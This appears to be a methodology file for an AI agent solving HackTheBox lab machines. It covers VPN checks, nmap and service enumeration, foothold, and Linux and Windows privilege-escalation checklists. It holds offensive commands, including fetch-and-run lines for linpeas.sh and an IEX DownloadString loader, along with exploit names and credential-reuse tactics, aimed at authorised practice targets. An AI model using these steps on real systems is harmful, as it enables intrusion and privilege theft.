---
description: HackTheBox machine (box) methodology: VPN-gated 10.x targets, full enumeration, foothold to user.txt, privilege escalation to root.txt, dual-flag submission
metadata:
  shortcodename: machine-solving
---

# HTB Machine Solving

Machines are long-lived multi-service hosts on the HTB OpenVPN network: the opposite of challenge containers. There is NO source to read first: enumeration IS discovery. Full nmap is mandatory, not an anti-pattern (the challenge-solver rules against scanning apply to challenge instances only).

## Non-negotiable order

1. **Access**: `BINARYPILOT_VPN_PROFILE` set → tunnel is up (verify ONCE with `ip a | grep tun`; log at `/tmp/openvpn.log` if in doubt). Unset → stop and ask the user for `HTB_VPN_OVPN=/path/to/<product>.ovpn` (per-product, NOT interchangeable).
2. **Check the profile first**: `htb_get_machine_info` (id or name slug) → OS, and `isSingleFlag`: single-flag machines have NO root.txt: the solve is complete after the one flag.
3. **Spawn**: `htb_spawn_machine(machine_id)` → polls `/v5/virtual_machine/active` and returns the assigned 10.x IP + `expires_at` (instance lifetime: `htb_reset_machine` refreshes a box close to expiry). `ping -c2 <ip>`: no reply = wrong VPN product for this machine, stop and report.
4. **Enumerate** (two-pass, bounded):
   - `nmap -n -Pn --open --top-ports 100 -T4 --max-retries 1 --host-timeout 90s -oA nmap_quick <ip>`
   - `nmap -n -Pn -p- --open --min-rate 2000 --max-retries 1 -oA nmap_all <ip>`
   - Version/scripts on open ports: `nmap -n -Pn -p<ports> -sV -sC --script-timeout 60s <ip>`
   - UDP only when TCP is dry: `nmap -sU --top-ports 20 --open <ip>`
5. **Service-level enum**: web (below), SMB (`smbclient -L //ip -N`, `enum4linux -a`, `crackmapexec smb ip --shares`), SNMP (`snmpwalk -v2c -c public ip`), FTP/anonymous, NFS (`showmount -e ip`), SMTP, LDAP, Redis, MSSQL/MySQL.
6. **Web**: visit every vhost/port in the browser first; `ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt -u http://ip/FUZZ` for content, plus extensions (`php,html,txt,bak,old,zip`); note the stack before attacking (a WordPress → `wpscan`, a Tomcat `/manager` → credential stuffing, not SSTI).
7. **Foothold**: exploit the found service, land a shell, stabilize (`python3 -c 'import pty;pty.spawn("/bin/bash")'`), and read the user flag:
   - Linux: `/home/<user>/user.txt` (or `grep -r user.txt` home dirs)
   - Windows: `C:\Users\<user>\Desktop\user.txt`
8. **Submit user flag**: `htb_submit_machine_flag(machine_id, flag)` → on acceptance `report_solve(kind='machine', flag_type='user')`. Machine flags are BARE 32-char hex (MD5-shaped, no `HTB{}` wrapper on regular machines).
9. **Privesc** (below) → root flag (`/root/root.txt`, `C:\Users\Administrator\Desktop\root.txt`) → submit the same way with `flag_type='root'` (skip on single-flag machines).
10. **Close out**: `htb_stop_machine(machine_id)` to free the slot, then `finish_solve`.

## Linux privesc checklist (run in this order)

- `sudo -l` (then GTFOBins every allowed binary; try sudo version CVEs: 1.8.31 baron samedit, 1.6.1p1 CVE-2021-3156)
- SUID/SGID: `find / -perm -4000 -type f 2>/dev/null` → GTFOBins each
- Capabilities: `getcap -r / 2>/dev/null` (cap_setuid, cap_dac_read_search)
- Cron: `crontab -l`, `ls -la /etc/cron*`, world-writable cron scripts, PATH-hijackable cron entries
- Writable /etc/passwd (drop a `openssl passwd` hash), ld.so.preload, /etc/sudoers.d
- `linpeas.sh` when manual checks stall: `curl -fsSL https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh -o /tmp/linpeas.sh && bash /tmp/linpeas.sh` (traffic rides the sandbox proxy)
- Kernel exploits are LAST, not first (matching distro: `uname -a`, `cat /etc/os-release`)

## Windows privesc checklist

- `whoami /priv` FIRST: SeImpersonate → Potato family (GodPotato/JuicyPotato/printspoofer); SeBackup → robocopy SAM/SYSTEM; SeLoadDriver; SeTakeOwnership
- `systeminfo` → missing-patch KE (older boxes: MS17-010, CVE-2021-1675 PrintNightmare, CVE-2021-36934 hive)
- Unquoted service paths, writable service bins (`accesschk`/`sc qc`), AlwaysInstallElevated (both registry keys), scheduled tasks, Autologon registry creds, stored creds (`cmdkey /list`, `dir /a C:\Users\*\AppData\*cred*`)
- `winpeas` when stalled: fetch from PEASS-ng releases and run; meter-less alternatives: `powershell -c "IEX(New-Object Net.WebClient).DownloadString('.../PowerUp.ps1')"`

## Machine-specific discipline

- **Persistence over restarts**: a bricked box (crashed service, deleted files, lockout) is fixed by `htb_reset_machine(machine_id)`: it wipes your foothold too; re-enumerate from scratch, re-notes are in the shared notes.
- **Credentials are the pivot**: reuse every found password/empty-credential across SSH/SMB/WinRM/DB and su-escalation (`su root` with a user's password is a solve on many easy boxes).
- **Flag files are the objective**: never spend turns on post-exploitation that doesn't lead to user.txt/root.txt (no persistence backdoors, no loot exfil beyond creds).
- **Two writeups minimum per machine** are not required: ONE writeup per accepted flag via report_solve, each naming its flag_type.
- If only the user flag lands after real effort on privesc: submit it, report_solve it, and state exactly which privesc avenues were exhausted in finish_scan.
